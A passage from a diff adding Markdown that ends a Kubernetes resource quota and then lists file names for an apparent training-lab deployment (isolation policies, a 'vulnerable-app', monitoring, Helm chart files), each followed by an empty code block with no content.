+    count/pods: "10"
+    count/services: "5"
+    count/persistentvolumeclaims: "2" 
+```
+
+student-isolation.yml:
+```
+
+```
+
+isolation.yml:
+```
+
+```
+
+vulnerable-app.yml:
+```
+
+```
+
+web-server.yml:
+```
+
+```
+
+grafana.yml:
+```
+
+```
+
+prometheus.yml:
+```
+
+```
+
+Chart.yaml:
+```
+
+```
+
+values.yaml:
+```
+
+```
+
+deployment.yaml:
+```
+
+```
+
+ingress.yaml:
+```
+
+```
+
+service.yaml:
+```
+
+```
